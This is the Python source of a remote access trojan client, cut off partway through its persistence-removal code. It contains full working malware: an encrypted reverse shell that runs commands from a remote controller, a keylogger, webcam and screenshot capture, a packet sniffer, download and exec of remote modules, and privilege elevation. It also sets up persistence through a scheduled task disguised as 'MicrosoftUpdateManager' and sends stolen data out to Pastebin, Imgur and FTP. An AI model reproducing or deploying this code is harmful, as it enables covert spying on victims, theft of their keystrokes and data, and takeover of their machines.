#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 Daniel Vega-Myhre
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

'''  

        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
        ,adPPPPP88 88       88 8b       88 88	       8b	88
        88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                                aa,    ,88 	        aa,    ,88
                                 "Y8bbdP"          	 "Y8bbdP'

                                                       88                          ,d
                                                       88                          88
         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
        8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
                    aa,    ,88  aa,    ,88 88                                      "Y888
                     "Y8bbdP"    "Y8bbdP"  88

'''

import os
import sys
import time
import json
import socket
import threading
import subprocess
from mss import mss
from uuid import uuid1
from ftplib import FTP
from struct import pack
from random import choice
from platform import uname
from imp import new_module
from zipfile import ZipFile
from requests import request
from logging import getLogger
from urllib import urlretrieve
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from tempfile import mktemp, gettempdir
from base64 import b64encode, b64decode
from logging.handlers import SocketHandler
from Crypto.Util.number import long_to_bytes, bytes_to_long
if os.name is 'nt':
    from ctypes import windll
    from pyHook import HookManager
    from pythoncom import PumpMessages
    from win32com.shell.shell import ShellExecuteEx
    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
    from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
else:
    from pyxhook import HookManager



class Client(object):
    
    global __modules__
    global __command__

    __command__ = {}
    __modules__ = {}

    def __init__(self, **kwargs):
        self._setup(**kwargs)
        self._exit      = 0
        self._threads   = {}
        self._info      = self._get_info()
        self._logger    = self._get_logger()
        self._modules   = {mod: getattr(self, mod) for mod in __modules__}
        self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
        self._result    = {mod: dict({}) for mod in self._modules}

    # ------------------- private functions -------------------------

    def _help(self, *arg): return '\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])

    def _help_command(self, cmd): return getattr(self, cmd).func_doc if cmd in self._commands else "'{}' not found".format(cmd)
    
    def _help_modules(self): return '\n'.join(['{:>12}{:>13}'.format(mod, ('enabled' if self._modules[mod].status else 'disabled')) for mod in self._modules])
    
    def _wget(self, target): return urlretrieve(target)[0]
    
    def _cat(self,filename): return open(filename).read(4000) 
    
    def _unzip(self, fname): return ZipFile(fname).extractall('.')
    
    def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')

    def _pad(self, s): return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'

    def _ls(self, *path): return '\n'.join(os.listdir(path[0])) if path else '\n'.join(os.listdir('.'))

    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]

    def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Family', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [i for i in uname()] + [request('GET', 'http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}

    def _get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
  
    def _status(self,c=None): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0)) if not c else '%d days, %d hours, %d minutes, %d seconds' % (int(c/86400.0), int((c%86400.0)/3600.0), int((c%3600.0)/60.0), int(c%60.0))

    def _persistence(self):
        result = {}
        for method in self.persistence.options:
            if method not in self._result['persistence']:
                try:
                    function = '_persistence_add_{}_{}'.format(*method.split())
                    result[method] = getattr(self, function)()
                except Exception as e:
                    result[method] = str(e)
        self._result['persistence'].update(result)
        return result

    def _screenshot(self):
        tmp = mktemp(suffix='.png')
        with mss() as screen:
            img = screen.shot(output=tmp)
        result = self._imgur(img)
        self._result['screenshot'].update({ time.ctime() : result })
        return result


    def _keylogger(self):
        self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name='keylogger')
        self._threads['keylogger'].start()
        result = 'Keylogger started at {}'.format(time.ctime())
        self._result['keylogger'].update({ time.ctime() : result })
        return result

    def _webcam(self):
        if self.webcam.options['video']:
            if 'video' not in self._result['webcam']:
                self._result['webcam'].update({'video': {}})
            result = self._webcam_video()
            self._result['webcam']['video'][time.ctime()] = result
        else:
            if 'image' not in self._result['webcam']:
                self._result['webcam'].update({'image': {}})
            result = self._webcam_image()
            self._result['webcam']['image'][time.ctime()] = result
        return result

    def _packetsniff(self):
        try:
            result  = self._packetsniff_manager(self.packetsniff.options['seconds'])
        except Exception as e:
            result  = 'Error monitoring network traffic: {}'.format(str(e))
        self._result['packetsniff'].update({ time.ctime() : result })
        return result

    def _hidden_process(self, path, shell=False):
        info = subprocess.STARTUPINFO()
        info.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
        info.wShowWindow = subprocess.SW_HIDE
        p = subprocess.Popen(path, startupinfo=info)
        return p

    def _target(self, **kwargs):
        try:
            ab = request('GET', long_to_bytes(long(self.__a__)), headers={'API-Key': long_to_bytes(long(self.__b__))}).json() 
            return ab[ab.keys()[0]][0].get('ip')
        except Exception as e:
            if self.__v__:
                print 'Target error: {}'.format(str(e))
    
    def _connect(self, host='localhost', port=1337):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self.__v__:
                print 'Connecting to {}:{}...'.format(host, port)
            s.connect((host, port))
            return s
        except Exception as e:
            if self.__v__:
                print 'Connection error: {}'.format(str(e))
            time.sleep(10)
            return self._connect(host, port)

    def _send(self, data, method='default'):
        try:
            block = data[:4096]
            data  = data[len(block):]
            ciphertext  = self._encrypt(block)
            msg = '{}:{}\n'.format(method, ciphertext)
            try:
                self._socket.sendall(msg)
            except socket.error: return
            if len(data):
                return self._send(data, method)
        except Exception as e:
            if self.__v__:
                print 'Send error: {}'.format(str(e))

    def _receive(self):
        try:
            data = ""
            self._socket.setblocking(False) if self.standby.status.is_set() else self._socket.setblocking(True)
            while "\n" not in data:
                try:
                    data += self._socket.recv(1024)
                except socket.error: return
            data = self._decrypt(data.rstrip()) if len(data) else data
            print data
            return data
        except Exception as e:
            if self.__v__:
                print 'Receive error: {}'.format(str(e))

    def _diffiehellman(self, bits=2048):
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self._socket.sendall(long_to_bytes(xA))
            xB = bytes_to_long(self._socket.recv(256))
            x = pow(xB, a, p)
            return SHA256.new(long_to_bytes(x)).digest()
        except Exception as e:
            if self.__v__:
                print 'Diffie-Hellman error: {}'.format(str(e))

    def _encrypt(self, plaintext):
        try:
            text = self._pad(bytes(plaintext))
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self._dhkey[:16], AES.MODE_CBC, iv)
            ciphertext = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(self._dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
            output = b64encode(ciphertext + hmac_sha256)
            return output
        except Exception as e:
            if self.__v__:
                print 'Error: {}'.format(str(e))

    def _decrypt(self, ciphertext):
        try:
            ciphertext  = b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(self._dhkey[:16], AES.MODE_CBC, iv)
            check_hmac  = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(self._dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            if check_hmac != calc_hmac:
                self._logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
            return output.rstrip(b'\0')
        except Exception as e:
            if self.__v__:
                print 'Decryption error: {}'.format(str(e))

    def _obfuscate(self, data, encoding=None):
        data    = bytes(data)
        p       = []
        n       = len(data)
        block   = os.urandom(2)
        for i in xrange(2, 10000):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    block += os.urandom(1)
                    break
            if not is_mul:
                if len(data):
                    p.append(i)
                    block += data[0]
                    data = data[1:]
                else:
                    return b64encode(block)

    def _deobfuscate(block, encoding=None):
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return str().join([block[i] for i in p])

    def _kill(self):
        try:
            self._exit = True
            for i in self._threads:
                try:
                    t = self._threads.pop(i, None)
                    del t
                except: pass
            for method in self.persistence.options:
                try:
                    target = 'persistence_remove_{}_{}'.format(*method.split())
                    getattr(self, target)()
                except Exception as e2:
                    if self.__v__:
                        print 'Error removing persistence: {}'.format(str(e2))
            try:
                self._socket.close()
            except: pass
            try:
                if self.__f__:
                    os.remove(self.__f__)
                elif '__file__' in globals():
                    os.remove(__file__)
                elif len(sys.argv) >= 1:
                    os.remove(sys.argv[0])
            except: pass
        finally:
            exit(0)

    def _enable(self, module):
        try:
            if type(getattr(self, module).im_func.status) is bool:
                getattr(self, module).im_func.status = True
            elif hasattr(getattr(self, module).im_func.status, 'clear'):
                getattr(self, module).im_func.status.set()
            return "'{}' enabled.".format(str(module))
        except Exception as e:
            return "Error: {}".format(str(e))

    def _disable(self, module):
        try:
            if type(getattr(self, module).im_func.status) is bool:
                getattr(self, module).im_func.status = False
            elif hasattr(getattr(self, module).im_func.status, 'clear'):
                getattr(self, module).im_func.status.clear()
            return "'{}' disabled.".format(str(module))
        except Exception as e:
            return "Error: {}".format(str(e))

    def _set(self, arg):
        module, _, opt = arg.partition(' ')
        option, _, val = opt.partition('=')
        if not hasattr(self, module):
            return "Module '{}' not found".format(module)
        if val.lower() in ('1','true'):
            val = True
        elif val.lower() in ('0', 'false'):
            val = False
        elif val.isdigit():
            val = int(val)
        try:
            getattr(self, module).options[option] = val
        except Exception as e:
            return 'Error: {}'.format(str(e))
        return json.dumps(getattr(self, module).options, indent=2, separators=(',', ': '), sort_keys=True)

    def _command(fx, cx=__command__, mx=__modules__):
        if fx.func_name is 'persistence':
            fx.platforms = ['win32','darwin']
            fx.options   = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
            fx.status    = True if sys.platform in fx.platforms else False
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'keylogger':
            fx.platforms = ['win32','darwin','linux2']
            fx.options   = {'max_bytes': 512, 'next_upload': time.ctime(time.time() + 300.0), 'buffer': bytes(), 'window': None}
            fx.status    = True if sys.platform in fx.platforms else False
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'webcam':
            fx.platforms = ['win32']
            fx.options   = {'image': True, 'video': bool()}
            fx.status    = True if sys.platform in fx.platforms else False
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'packetsniff':
            fx.platforms = ['darwin','linux2']
            fx.options   = { 'next_upload': time.ctime(time.time() + 300.0), 'buffer': []}
            fx.status    = True if sys.platform in fx.platforms else False
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'screenshot':
            fx.platforms = ['win32','linux2','darwin']
            fx.options   = {}
            fx.status    = True if sys.platform in fx.platforms else False
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'standby':
            fx.platforms = ['win32','linux2','darwin']
            fx.options   = {'next_run': time.ctime(time.time() + 300.0)}
            fx.status    = threading.Event()
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'shell':
            fx.platforms = ['win32','linux2','darwin']
            fx.options   = {}
            fx.status    = threading.Event()
            mx.update({fx.func_name: fx})
        cx.update({fx.func_name: fx})
        return fx

    def _options(self, *module):
        try:
            if not module:
                modlist = [_ for _ in self._modules]
            else:
                module = module[0]
                if module not in self._modules:
                    return "'{}' is not a module".format(str(module))
                else:
                    modlist = [module]
            return self._show({m: self._modules[m].options for m in modlist})
        except Exception as e:
            return 'Option error: {}'.format(str(e))
            
    def _show(self, target):
        try:
            results = json.dumps(target, indent=2, separators=(',','\t'), sort_keys=True)
        except:
            try:
                string_repr = repr(target)
                string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                string_repr = string_repr.replace('(', '[').replace(')', ']')
                results     = json.dumps(json.loads(string_repr), indent=2, separators=(',', '\t'), sort_keys=True)
            except:
                results = repr(target)
        return results

    def _ip(self):
        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
        for target in sources:
            try:
                ip = request('GET', target).content
                if socket.inet_aton(ip):
                    return ip
            except: pass

    def _admin(self):
        info = self._get_info()
        if info['Admin']:
            return {'User': info['login'], 'Administrator': info['admin']}
        if self.__f__:
            if os.name is 'nt':
                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
            else:
                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)

    def _new(self, args):
        if ' ' in args and args.split()[0] in ('module','update') and args.split()[1].startswith('http'):
            action = args.split()[0]
            target = args.split()[1]
            try:
                module = self._new_module(target)
            except Exception as e:
                return "Error creating new module: '{}'".format(str(e))
            if action == 'module':
                return "New module '{}' successfully created".format(str(module.__name__))
            elif action == 'update':
                exec module in globals()
        else:
            return self.new.func_doc

    def _new_module(self, uri, *kwargs):
        try:
            name    = os.path.splitext(os.path.basename(uri))[0] if 'name' not in kwargs else str(kwargs.get('name'))
            module  = new_module(name)
            source  = request('GET', uri).content
            code    = compile(source, name, 'exec')
            exec code in module.__dict__
            self._modules[name] = module
            return module
        except Exception as e:
            if self.__v__:
                print "Error creating module: {}".format(str(e))

    def _powershell(self, cmdline):
        try:
            cmds = cmdline if type(cmdline) is list else str(cmdline).split()
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
            info.wShowWindow = subprocess.SW_HIDE
            command=['powershell.exe', '/c', cmds]
            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
            results, _ = p.communicate()
            return results
        except Exception as e:
            if self.__v__:
                print 'Powershell error: {}'.format(str(e))

    def _get_logger(self, port=4321):
        module_logger   = getLogger(self._ip())
        module_logger.handlers = []
        module_handler  = SocketHandler(self._target(o=long(self.__a__), p=long(self.__b__)), port)
        module_logger.addHandler(module_handler)
        return module_logger

    def _imgur(self, filename):
        with open(filename, 'rb') as fp:
            data = b64encode(fp.read())
        os.remove(filename)
        result = request('POST', 'https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(long(self.__e__))}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
        return result

    def _pastebin(self, text):
        result = request('POST', 'https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(long(self.__c__)), 'api_user_key': long_to_bytes(long(self.__d__)), 'api_option': 'paste', 'api_paste_code': text}).content
        return result
    
    def _ftp(self, filepath):
        try:
            host = FTP(*long_to_bytes(self.__q__).split())
            if self._info.get('IP Address') not in host.nlst('/htdocs'):
                host.mkd('/htdocs/{}'.format(self._info.get('IP Address')))
            result = '/htdocs/{}/{}'.format(self._info.get('IP Address'), os.path.basename(filepath))
            upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
        except Exception as e:
            result = str(e)
        return result

    def _run(self):
        for name, module in self._modules.items():
             if module.status and sys.platform in module.platforms:
                self._threads[name] = threading.Thread(target=module, name=name)
                self._threads[name].daemon = True
        for task in self._threads.values():
            try:
                task.start()
            except: pass
        for worker, task in self._threads.items():
            if worker not in ('keylogger','packetsniff'):
                if task.is_alive():
                    task.join()
                _ = self._threads.pop(worker, None)
        return self._show(self._result)

    def _shell(self):
        self.standby.status.clear()
        self.shell.status.set()
        while True:
            self.shell.status.wait()
            prompt = "[%d @ {}]> ".format(os.getcwd())
            print prompt
            self._send(prompt, method='prompt')   
            data = self._receive()
            cmd, _, action = bytes(data).partition(' ')
            if cmd in self._commands:
                result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
            else:
                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            if result and len(result):
                result = '\n' + str(result) + '\n'
                self._send(result, method=cmd)
            if not self.shell.status.is_set():
                break
        return self.standby()

    def _standby(self):
        self.shell.status.clear()
        self.standby.status.set()
        while True:
            self.standby.status.wait()
            b = self._receive()
            if b and len(b):
                self.standby.status.clear()
                self.shell.status.set()
                break
            elif time.time() > time.mktime(time.strptime(self.standby.options['next_run'])):
                self._send(self._run(), method='standby')
                self.standby.options['next_run'] = time.ctime(time.mktime(time.strptime(self.standby.options['next_run'])) + 300.0)
            else:
                time.sleep(1)
        return self.shell()

    def _start(self):
        try:
            self._socket  = self._connect(host=self._target(o=self.__a__, p=self.__b__))
            self._dhkey   = self._diffiehellman()
            while True:
                if self._exit:
                    break
                try:
                    self.shell()
                except KeyboardInterrupt:
                    break
        except Exception as e:
            if self.__v__:
                print "Error: '{}'".format(str(e))

# ------------------- keylogger -------------------------

    def _keylogger_event(self, event):
        if event.WindowName != self.keylogger.options['window']:
            self.keylogger.options['window'] = event.WindowName
            self.keylogger.options['buffer'] += "\n[{}]\n".format(self.keylogger.options['window'])
        if event.Ascii > 32 and event.Ascii < 127:
            self.keylogger.options['buffer'] += chr(event.Ascii)
        elif event.Ascii == 32:
            self.keylogger.options['buffer'] += ' '
        elif event.Ascii in (10,13):
            self.keylogger.options['buffer'] += ('\n')
        elif event.Ascii == 8:
            self.keylogger.options['buffer'] = self.keylogger.options['buffer'][:-1]
        else:
            pass
        return True
        
    def _keylogger_helper(self):
        while True:
            if self._exit:
                break
            if time.time() > time.mktime(time.strptime(self.keylogger.options['next_upload'])):
                if len(self.keylogger.options['buffer']) > self.keylogger.options['max_bytes']:
                    result  = self._pastebin(self.keylogger.options['buffer'])
                    if self.standby.status.is_set():
                        self._logger.log(40, result, extra={'submodule':'keylogger'})
                    self._result['keylogger'].update({time.ctime(): result})
                    self.keylogger.options['buffer']  = ''
                self.keylogger.options['next_upload'] = time.ctime(time.mktime(time.strptime(self.keylogger.options['next_upload'])) + 300.0)
            else:
                time.sleep(1)

    def _keylogger_manager(self):
            self._threads['keylogger_helper'] = threading.Thread(target=self._keylogger_helper, name='keylogger_helper')
            self._threads['keylogger_helper'].start()
            while True:
                if self._exit:
                    break
                hm = HookManager()
                hm.KeyDown = self._keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)
                    
# ------------------- webcam -------------------------

    def _webcam_image(self):
        dev = VideoCapture(0)
        tmp = mktemp(suffix='.png')
        r,f = dev.read()
        waitKey(1)
        imwrite(tmp, f)
        dev.release()
        result = self._imgur(tmp)
        return result

    def _webcam_video(self):
        fpath   = mktemp(suffix='.avi')
        fourcc  = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
        output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
        dev     = VideoCapture(0)
        end     = time.time() + 5.0
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if waitKey(0) and time.time() > end: break
        dev.release()
        result = self._ftp(fpath)
        return result

# ------------------- packetsniff -------------------------

    def _packetsniff_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src     = udp_hdr[0]
            dst     = udp_hdr[1]
            length  = udp_hdr[2]
            chksum  = udp_hdr[3]
            data    = data[8:]
            self.packetsniff.options['buffer'].append('|================== UDP HEADER ==================|')
            self.packetsniff.options['buffer'].append('|================================================|')
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniff.options['buffer'].append('|================================================|')
            return data
        except Exception as e:
            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('UDP', str(e)))

    def _packetsniff_tcp_header(self, recv_data):
        try:
            tcp_hdr  = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num  = tcp_hdr[2]
            ack_num  = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags    = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]

            self.packetsniff.options['buffer'].append('|================== TCP HEADER ==================|')
            self.packetsniff.options['buffer'].append('|================================================|')
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniff.options['buffer'].append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('TCP', str(e)))

    def _packetsniff_ip_header(self, data):
        try:
            ip_hdr  = struct.unpack('!6H4s4s', data[:20]) 
            ver     = ip_hdr[0] >> 12
            ihl     = (ip_hdr[0] >> 8) & 0x0f
            tos     = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id   = ip_hdr[2]
            flags   = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl     = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum  = ip_hdr[5]
            src     = socket.inet_ntoa(ip_hdr[6])
            dest    = socket.inet_ntoa(ip_hdr[7])
            data    = data[20:]

            self.packetsniff.options['buffer'].append('|================== IP HEADER ===================|')
            self.packetsniff.options['buffer'].append('|================================================|')
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniff.options['buffer'].append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('IP', str(e)))


    def _packetsniff_eth_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto   = eth_hdr[2] >> 8

            self.packetsniff.options['buffer'].append('|================================================|')
            self.packetsniff.options['buffer'].append('|================== ETH HEADER ==================|')
            self.packetsniff.options['buffer'].append('|================================================|')
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniff.options['buffer'].append('|================================================|')

            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('ETH', str(e)))

    def _packetsniff_manager(self, seconds):
        limit = time.time() + float(seconds)
        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = self._packetsniff_eth_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = self._packetsniff_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = self._packetsniff_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = self._packetsniff_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        result = self._pastebin('\n'.join(self.packetsniff.options['buffer']))
        self._result['packetsniff'][time.ctime()] = result
        self.packetsniff.options['buffer'] = []
        return result

# ------------------- persistence -------------------------

    def _persistence_add_scheduled_task(self):
        if self.__f__:
            tmpdir      = gettempdir()
            task_name   = 'MicrosoftUpdateManager'
            task_run    = os.path.join(tmpdir, long_to_bytes(long(self.__f__)))
            copy        = 'copy' if os.name is 'nt' else 'cp'
            if not os.path.isfile(task_run):
                backup  = os.popen(' '.join(copy, long_to_bytes(long(self.__f__)), task_run)).read()
            try:
                if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                    return True
            except Exception as e:
                if self.__v__:
                    print 'Add scheduled task error: {}'.format(str(e))
        return False

    def _persistence_remove_scheduled_task(self):
        if self.__f__:
            try:
                task_name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.__f__))))[0]
                if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
